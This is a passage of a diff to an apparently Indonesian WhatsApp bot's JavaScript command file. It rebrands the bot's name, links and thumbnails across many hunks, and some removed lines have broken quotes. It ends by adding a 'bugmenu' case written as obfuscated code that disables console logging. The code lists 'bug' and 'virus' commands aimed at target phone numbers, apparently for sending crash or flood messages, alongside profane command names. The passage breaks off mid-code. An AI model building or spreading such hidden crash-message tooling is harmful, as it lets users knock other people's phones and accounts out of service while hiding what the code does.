 "previewType": "PHOTO",
 "showAdAttribution": true,
-"sourceUrl": `https://youtube.com/channel/HAMZXPRESET`,
-"thumbnailUrl": `https://telegra.ph/file/1de53cbe337ef658fe6e8.jpg`
+"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
+"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
 }}, caption: anu })
 }
 break
@@ -3405,17 +3405,17 @@ break
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
  ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
 
-© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟
+© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
 `
-jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/8b186ae775eebeb9403a2.jpg'}, 
+jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
 "contextInfo": {
 "externalAdReply": {
-"title": `©⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟`,
+"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
 "body":`Runtime ${runtime(process.uptime())}`,
 "previewType": "PHOTO",
 "showAdAttribution": true,
-"sourceUrl": `https://youtube.com/channel/HAMZXPRESET`,
-"thumbnailUrl": `https://telegra.ph/file/1de53cbe337ef658fe6e8.jpg`
+"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
+"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
 }}, caption: anu })
 }
 break
@@ -3442,17 +3442,17 @@ break
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
  ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
 
-© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟
+© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
 `
-jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/8b186ae775eebeb9403a2.jpg}, 
+jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
 "contextInfo": {
 "externalAdReply": {
-"title": `©⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟`,
+"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
 "body":`Runtime ${runtime(process.uptime())}`,
 "previewType": "PHOTO",
 "showAdAttribution": true,
-"sourceUrl": `https://youtube.com/channel/HAMZXPRESET`,
-"thumbnailUrl": `https://telegra.ph/file/1de53cbe337ef658fe6e8.jpg`
+"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
+"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
 }}, caption: anu })
 }
 break
@@ -3486,17 +3486,17 @@ break
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
  ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
 
-© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟
+© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
 `
-jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/8b186ae775eebeb9403a2.jpg'}, 
+jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
 "contextInfo": {
 "externalAdReply": {
-"title": `©⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟`,
+"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
 "body":`Runtime ${runtime(process.uptime())}`,
 "previewType": "PHOTO",
 "showAdAttribution": true,
-"sourceUrl": `https://youtube.com/channel/HAMZXPRESET`,
-"thumbnailUrl": `https://telegra.ph/file/1de53cbe337ef658fe6e8.jpg`
+"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
+"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
 }}, caption: anu })
 }
 break
@@ -3544,17 +3544,17 @@ break
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
  ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
 
-© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟
+© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
 `
-jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/8b186ae775eebeb9403a2.jpg'}, 
+jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
 "contextInfo": {
 "externalAdReply": {
-"title": `©⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟`,
+"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
 "body":`Runtime ${runtime(process.uptime())}`,
 "previewType": "PHOTO",
 "showAdAttribution": true,
-"sourceUrl": `https://youtube.com/channel/HAMZXPRESET`,
-"thumbnailUrl": `https://telegra.ph/file/1de53cbe337ef658fe6e8.jpg`
+"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
+"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
 }}, caption: anu })
 }
 break
@@ -3583,17 +3583,17 @@ break
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
  ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
 
-© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟
+© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
 `
-jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/8b186ae775eebeb9403a2.jpg'}, 
+jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
 "contextInfo": {
 "externalAdReply": {
-"title": `©⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟
+"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
 "body":`Runtime ${runtime(process.uptime())}`,
 "previewType": "PHOTO",
 "showAdAttribution": true,
-"sourceUrl": `https://youtube.com/channel/HAMZXPRESET`,
-"thumbnailUrl": `https://telegra.ph/file/1de53cbe337ef658fe6e8.jpg`
+"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
+"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
 }}, caption: anu })
 }
 break
@@ -3619,17 +3619,17 @@ break
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
  ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
 
-© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟
+© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
 `
-jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/8b186ae775eebeb9403a2.jpg'}, 
+jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
 "contextInfo": {
 "externalAdReply": {
-"title": `©⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟`,
+"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
 "body":`Runtime ${runtime(process.uptime())}`,
 "previewType": "PHOTO",
 "showAdAttribution": true,
-"sourceUrl": `https://youtube.com/HAMZXPRESET`,
-"thumbnailUrl": `https://telegra.ph/file/1de53cbe337ef658fe6e8.jpg`
+"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
+"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
 }}, caption: anu })
 }
 break
@@ -3660,17 +3660,17 @@ break
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
  ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
 
-© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟
+© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
 `
-jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/8b186ae775eebeb9403a2.jpg'}, 
+jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
 "contextInfo": {
 "externalAdReply": {
-"title": `©⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟`,
+"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
 "body":`Runtime ${runtime(process.uptime())}`,
 "previewType": "PHOTO",
 "showAdAttribution": true,
-"sourceUrl": `https://youtube.com/channel/HAMZXPRESET`,
-"thumbnailUrl": `https://telegra.ph/file/1de53cbe337ef658fe6e8.jpg`
+"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
+"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
 }}, caption: anu })
 }
 break
@@ -3717,17 +3717,17 @@ break
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
  ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
 
-© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟
+© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
 `
-jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/8b186ae775eebeb9403a2.jpg'}, 
+jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
 "contextInfo": {
 "externalAdReply": {
-"title": `©⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟`,
+"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
 "body":`Runtime ${runtime(process.uptime())}`,
 "previewType": "PHOTO",
 "showAdAttribution": true,
-"sourceUrl": `https://youtube.com/channel/HAMZXPRESET`,
-"thumbnailUrl": `https://telegra.ph/file/1de53cbe337ef658fe6e8.jpg`
+"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
+"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
 }}, caption: anu })
 }
 break
@@ -3761,17 +3761,17 @@ break
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
  ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
 
-© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟
+© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
 `
-jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/8b186ae775eebeb9403a2.jpg'}, 
+jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
 "contextInfo": {
 "externalAdReply": {
-"title": `©⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟`,
+"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
 "body":`Runtime ${runtime(process.uptime())}`,
 "previewType": "PHOTO",
 "showAdAttribution": true,
-"sourceUrl": `https://youtube.com/channel/HAMZXPRESET`,
-"thumbnailUrl": `https://telegra.ph/file/1de53cbe337ef658fe6e8.jpg`
+"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
+"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
 }}, caption: anu })
 }
 break
@@ -3798,17 +3798,17 @@ break
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
  ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
 
-© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟
+© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
 `
-jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/8b186ae775eebeb9403a2.jpg'}, 
+jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
 "contextInfo": {
 "externalAdReply": {
-"title": `©⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟`,
+"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
 "body":`Runtime ${runtime(process.uptime())}`,
 "previewType": "PHOTO",
 "showAdAttribution": true,
-"sourceUrl": `https://youtube.com/channel/HAMZXPRESET`,
-"thumbnailUrl": `https://telegra.ph/file/1de53cbe337ef658fe6e8.jpg`
+"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
+"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
 }}, caption: anu })
 }
 break
@@ -3833,17 +3833,17 @@ break
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
  ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
 
-© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟
+© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
 `
-jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/8b186ae775eebeb9403a2.jpg'}, 
+jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
 "contextInfo": {
 "externalAdReply": {
-"title": `©⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟`,
+"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
 "body":`Runtime ${runtime(process.uptime())}`,
 "previewType": "PHOTO",
 "showAdAttribution": true,
-"sourceUrl": `https://youtube.com/channel/HAMZXPRESET`,
-"thumbnailUrl": `https://telegra.ph/file/1de53cbe337ef658fe6e8.jpg`
+"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
+"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
 }}, caption: anu })
 }
 break
@@ -3864,17 +3864,17 @@ break
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
  ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
 
-© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟
+© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
 `
-jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/8b186ae775eebeb9403a2.jpg'}, 
+jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
 "contextInfo": {
 "externalAdReply": {
-"title": `©⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟`,
+"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
 "body":`Runtime ${runtime(process.uptime())}`,
 "previewType": "PHOTO",
 "showAdAttribution": true,
-"sourceUrl": `https://youtube.com/channel/HAMZXPRESET`,
-"thumbnailUrl": `https://telegra.ph/file/1de53cbe337ef658fe6e8.jpg`
+"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
+"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
 }}, caption: anu })
 }
 break
@@ -3896,17 +3896,17 @@ break
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
  ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
 
-© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟
+© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
 `
-jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/8b186ae775eebeb9403a2.jpg}, 
+jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
 "contextInfo": {
 "externalAdReply": {
-"title": `©⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟`,
+"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
 "body":`Runtime ${runtime(process.uptime())}`,
 "previewType": "PHOTO",
 "showAdAttribution": true,
-"sourceUrl": `https://youtube.com/channel/HAMZXPRESET`,
-"thumbnailUrl": `https://telegra.ph/file/1de53cbe337ef658fe6e8.jpg`
+"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
+"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
 }}, caption: anu })
 }
 break
@@ -3934,17 +3934,17 @@ break
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
  ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
 
-© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟
+© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
 `
-jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/8b186ae775eebeb9403a2.jpg'}, 
+jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
 "contextInfo": {
 "externalAdReply": {
-"title": `©⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟`,
+"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
 "body":`Runtime ${runtime(process.uptime())}`,
 "previewType": "PHOTO",
 "showAdAttribution": true,
-"sourceUrl": `https://youtube.com/channel/HAMZXPRESET`,
-"thumbnailUrl": `https://telegra.ph/file/1de53cbe337ef658fe6e8.jpg`
+"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
+"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
 }}, caption: anu })
 }
 break
@@ -3972,23 +3972,23 @@ break
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
  ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
 
-© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟
+© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
 `
-jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/8b186ae775eebeb9403a2.jpg'}, 
+jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
 "contextInfo": {
 "externalAdReply": {
-"title": `©⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟`,
+"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
 "body":`Runtime ${runtime(process.uptime())}`,
 "previewType": "PHOTO",
 "showAdAttribution": true,
-"sourceUrl": `https://youtube.com/channel/HAMZXPRESET`,
-"thumbnailUrl": `https://telegra.ph/file/1de53cbe337ef658fe6e8.jpg`
+"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
+"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
 }}, caption: anu })
 }
 break
 
  case 'bugmenu': { 
-function _0x2db8(){var _0x30036a=['josendbug6\x20(Nomer)\x20\x0a│➳\x20','joinfiniteto\x20(Nomer)\x20\x0a│➳\x20','jadibugdoc\x20(Reply\x20Media)\x20\x0a│➳\x20','jadidarkness\x20(Reply\x20Media)\x20\x0a│➳\x20','jogasbug12\x20(Nomer)\x20\x0a│➳\x20','josendbug11\x20(Nomer)\x20\x0a│➳\x20','josendbug8\x20(Nomer)\x20\x0a│➳\x20','josendbug3\x20(Nomer)\x20\x0a│➳\x20','console','jothelima\x20(jumlah)\x0a│➳\x20','jolokas\x20(jumlah)\x0a│➳\x20','jogasbug8\x20(Nomer)\x20\x0a│➳\x20','jobutto\x20(Nomer)\x20\x0a│➳\x20','jadikintil\x20(Teks/Reply\x20Teks)\x20\x0a│➳\x20','johelloto\x20(Nomer)\x0a│➳\x20','jobug9\x20(jumlah)\x0a│➳\x20','jobugstik\x20(jumlah)\x0a│➳\x20','jogasliveloc\x20(Nomer)\x0a│➳\x20','jotengkorak\x20(jumlah)\x0a│➳\x20','jobug1\x20(jumlah)\x0a│➳\x20','jadibugbutton\x20(Teks)\x20\x0a│➳\x20','4825818uRJFHE','sendMessage','jobugdocto\x20(Nomer)\x0a│➳\x20','39075bSlHRh','jobugvn\x20(jumlah)\x0a│➳\x20','kontolto\x20(Nomer)\x0a│➳\x20','jaditroli\x20(Teks)\x20\x0a│➳\x20','jadiliveloc\x20(Teks/Reply\x20Teks)\x20\x0a│➳\x20','jobuglist\x20(jumlah)\x0a│➳\x20','josantet\x0a│➳\x20','__proto__','toString','jobuttonbro\x20(jumlah)\x0a│➳\x20','jadilokas\x20(Teks)\x20\x0a│➳\x20','jobug3\x20(jumlah)\x0a│➳\x20','jobuginvite\x20(jumlah)\x0a│➳\x20','info','jogasinfinite\x20(Nomer)\x20\x0a│➳\x20','jobugstikv2\x20(jumlah)\x0a│➳\x20','jogaspay\x20(Nomer)\x20\x0a│➳\x20','18Zhizdn','josendbug12\x20(Nomer)\x20\x0a│➳\x20','jadikuntul\x20(Teks/Reply\x20Teks)\x20\x0a│➳\x20','jostikto\x20(Nomer)\x20\x0a│➳\x20','joinfinite\x0a│➳\x20','warn','Runtime\x20','apply','jopay\x20(jumlah)\x0a│➳\x20','jobug8\x20(jumlah)\x0a│➳\x20','jogasbug5\x20(Nomer)\x20\x0a│➳\x20','PHOTO','jolivelocv2\x20(jumlah)\x0a│➳\x20','josendbug1\x20(Nomer)\x20\x0a│➳\x20','jogastengkorak\x20(Nomer)\x20\x0a╰━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━•⩵꙰ཱི࿐\x0a\x20▬▭▬▭▬\x20✦✧✦\x20▬▭▬▭▬\x0a╭━━•›〘\x20JADIVIRUS\x20MENU\x20〙\x0a│➳\x20','jogasvn\x20(Nomer)\x20\x0a│➳\x20','joslebew\x0a│➳\x20','monyet\x20(jumlah)\x0a│➳\x20','jopayto\x20(Nomer)\x20\x0a│➳\x20','jolivelocto\x20(Nomer)\x0a│➳\x20','jobug6\x20(jumlah)\x0a│➳\x20','kintilto\x20(Nomer)\x0a│➳\x20','jadipeler\x20(Teks)\x20\x0a│➳\x20','kontol\x20(jumlah)\x0a│➳\x20','jovnto\x20(Nomer)\x20\x0a│➳\x20','exception','jogasbug4\x20(Nomer)\x20\x0a│➳\x20','josendbug2\x20(Nomer)\x20\x0a│➳\x20','https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','228674mbpTqU','jobug7\x20(jumlah)\x0a│➳\x20','jadibugloc\x20(Teks/Reply\x20Teks)\x20\x0a│➳\x20','720714oYXjVg','jobug5\x20(jumlah)\x0a│➳\x20','trace','(((.+)+)+)+$','jogasstik\x20(Nomer)\x20\x0a│➳\x20','jobuglocto\x20(Nomer)\x0a│➳\x20','bokep\x0a│➳\x20','3000464wduIoI','jogasbug3\x20(Nomer)\x20\x0a│➳\x20','jobug10\x20(jumlah)\x0a│➳\x20','josantetto\x20(Nomer)\x20\x0a│➳\x20','jogasbug6\x20(Nomer)\x20\x0a│➳\x20','jadingeness\x20(Reply\x20Media)\x20\x0a│➳\x20','jobug2\x20(jumlah)\x0a│➳\x20','jogaskuntul\x20(Nomer)\x0a│➳\x20','jogastroli\x20(Nomer)\x0a│➳\x20','©⏤͟͟͞𝙏𝙃𝙀\x20𝙃𝘼𝙈𝙕\x20𝘽𝙊𝙏𝙕','jogasbugloc\x20(Nomer)\x0a│➳\x20','{}.constructor(\x22return\x20this\x22)(\x20)','jadijoness\x20(Reply\x20Media)\x20\x0a│➳\x20','josendbug7\x20(Nomer)\x20\x0a│➳\x20','jogaskintol\x20(Nomer)\x0a│➳\x20','josendbug10\x20(Nomer)\x20\x0a│➳\x20','jobugdoc\x20(jumlah)\x0a│➳\x20','kuntulto\x20(Nomer)\x0a│➳\x20','length','constructor','jadicatalog\x20(ReplyImage\x20|\x20Teks)\x20\x0a│➳\x20','jogasbug10\x20(Nomer)\x20\x0a│➳\x20','jobugloc\x20(jumlah)\x0a│➳\x20','jogassantet\x20(Nomer)\x20\x0a│➳\x20','bind','polvot\x0a│➳\x20','36rmDsyS','jogaskintil\x20(Nomer)\x0a│➳\x20','josendbug4\x20(Nomer)\x20\x0a│➳\x20','ngenes\x20(jumlah)\x0a│➳\x20','https://telegra.ph/file/094abb98c63d1fbac703e.jpg','2204720iHlOff','search','jobuginviteto\x20(Nomer)\x0a│➳\x20','darkness\x20(jumlah)\x0a│➳\x20','jobug11\x20(jumlah)\x0a│➳\x20','joness\x20(jumlah)\x0a│➳\x20','buggam\x20(jumlah)\x0a│➳\x20','jadibugstik\x20(Reply\x20Sticker)\x20\x0a│➳\x20','jadimonyet\x20(Teks)\x20\x0a│➳\x20','jomomo\x20(jumlah)\x0a│➳\x20','table','jotagwae\x20(jumlah)\x0a│➳\x20','jogasbug11\x20(Nomer)\x20\x0a│➳\x20','jogasbug9\x20(Nomer)\x20\x0a│➳\x20','poll\x0a│➳\x20','jadibugvn\x20(Reply\x20Audio)\x20\x0a│➳\x20','73199WcGmUu','jobug12\x20(jumlah)\x0a│➳\x20','jotroli\x20(jumlah)\x0a│➳\x20','jogasbug2\x20(Nomer)\x20\x0a│➳\x20','jocatalog\x20(jumlah)\x0a│➳\x20','jobug4\x20(jumlah)\x0a│➳\x20'];_0x2db8=function(){return _0x30036a;};return _0x2db8();}function _0x225d(_0x562681,_0x43cf2e){var _0x5aa0ec=_0x2db8();return _0x225d=function(_0x3d8a83,_0x100604){_0x3d8a83=_0x3d8a83-0x109;var _0xf5a7be=_0x5aa0ec[_0x3d8a83];return _0xf5a7be;},_0x225d(_0x562681,_0x43cf2e);}var _0x15a6dc=_0x225d;(function(_0x4180ce,_0x4781bd){var _0x5eeb76=_0x225d,_0x3b9c31=_0x4180ce();while(!![]){try{var _0xdc47d1=parseInt(_0x5eeb76(0x121))/0x1+-parseInt(_0x5eeb76(0x124))/0x2+-parseInt(_0x5eeb76(0x178))/0x3*(-parseInt(_0x5eeb76(0x145))/0x4)+parseInt(_0x5eeb76(0x14a))/0x5+-parseInt(_0x5eeb76(0x189))/0x6*(parseInt(_0x5eeb76(0x15a))/0x7)+parseInt(_0x5eeb76(0x12b))/0x8+-parseInt(_0x5eeb76(0x175))/0x9;if(_0xdc47d1===_0x4781bd)break;else _0x3b9c31['push'](_0x3b9c31['shift']());}catch(_0x245cfa){_0x3b9c31['push'](_0x3b9c31['shift']());}}}(_0x2db8,0x391f3));var _0x559ff2=(function(){var _0x507e2a=!![];return function(_0x44b050,_0x66f8c5){var _0x5d90f4=_0x507e2a?function(){if(_0x66f8c5){var _0x81ca6b=_0x66f8c5['apply'](_0x44b050,arguments);return _0x66f8c5=null,_0x81ca6b;}}:function(){};return _0x507e2a=![],_0x5d90f4;};}()),_0x2c3f17=_0x559ff2(this,function(){var _0x3fff9d=_0x225d;return _0x2c3f17['toString']()[_0x3fff9d(0x14b)](_0x3fff9d(0x127))[_0x3fff9d(0x180)]()[_0x3fff9d(0x13e)](_0x2c3f17)[_0x3fff9d(0x14b)](_0x3fff9d(0x127));});_0x2c3f17();var _0x100604=(function(){var _0x3f2ba6=!![];return function(_0x4ce18b,_0x5b0343){var _0x4222ce=_0x3f2ba6?function(){var _0x4ea1fd=_0x225d;if(_0x5b0343){var _0x25759d=_0x5b0343[_0x4ea1fd(0x10b)](_0x4ce18b,arguments);return _0x5b0343=null,_0x25759d;}}:function(){};return _0x3f2ba6=![],_0x4222ce;};}()),_0x3d8a83=_0x100604(this,function(){var _0xa7d926=_0x225d,_0x328932;try{var _0x5ebefe=Function('return\x20(function()\x20'+_0xa7d926(0x136)+');');_0x328932=_0x5ebefe();}catch(_0x1ae269){_0x328932=window;}var _0x1db607=_0x328932[_0xa7d926(0x168)]=_0x328932[_0xa7d926(0x168)]||{},_0x1d1a04=['log',_0xa7d926(0x109),_0xa7d926(0x185),'error',_0xa7d926(0x11d),_0xa7d926(0x154),_0xa7d926(0x126)];for(var _0x33a396=0x0;_0x33a396<_0x1d1a04[_0xa7d926(0x13d)];_0x33a396++){var 